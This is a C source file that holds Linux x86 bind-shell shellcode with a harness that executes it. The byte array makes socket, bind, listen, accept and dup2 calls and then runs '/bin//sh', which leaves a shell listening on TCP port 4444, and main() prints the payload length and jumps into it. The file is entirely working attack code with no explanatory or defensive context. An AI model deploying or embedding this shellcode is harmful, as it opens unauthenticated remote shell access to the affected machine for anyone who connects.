#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\x31\xdb\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x52\x66\x68"
"\x11\x5c"  //PORT 4444  
"\x66\x6a\x02\x89\xe1\xb0\x66\xb3\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
